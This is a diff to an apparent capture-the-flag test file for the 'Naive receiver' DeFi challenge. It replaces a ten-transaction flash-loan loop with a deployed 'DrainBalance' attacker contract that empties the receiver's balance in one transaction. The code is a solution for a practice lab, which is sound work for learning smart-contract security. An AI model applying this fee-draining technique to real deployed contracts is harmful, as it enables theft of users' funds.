@@ -48,10 +48,21 @@ describe("[Challenge] Naive receiver", function () {
   });
 
   it("Exploit", async function () {
+    const DrainBalanceFactory = await ethers.getContractFactory(
+      "DrainBalance",
+      attacker
+    );
+    const drainBalanceContract = await DrainBalanceFactory.deploy(
+      this.pool.address
+    );
+
+    // do it in 1 transaction by deploying another contract
+    await drainBalanceContract.drainBalance(this.receiver.address);
+
     // do it in 10 transaction
-    for (let i = 0; i < 10; i++) {
-      await this.pool.flashLoan(this.receiver.address, 1);
-    }
+    // for (let i = 0; i < 10; i++) {
+    //   await this.pool.flashLoan(this.receiver.address, 1);
+    // }
   });
 
   after(async function () {
